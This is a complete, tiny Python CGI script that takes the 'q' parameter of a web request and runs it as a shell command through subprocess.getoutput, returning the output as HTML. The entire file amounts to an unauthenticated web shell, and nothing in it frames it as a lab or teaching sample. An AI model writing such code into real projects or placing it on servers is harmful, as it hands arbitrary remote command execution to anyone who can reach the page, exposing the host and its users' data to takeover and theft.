#!/usr/bin/python3

print("Content-type: text/html")
print()

import subprocess
import cgi


form = cgi.FieldStorage()
cmd = form.getvalue("q")

output = subprocess.getoutput(cmd)
print("<pre>" + output + "</pre>")
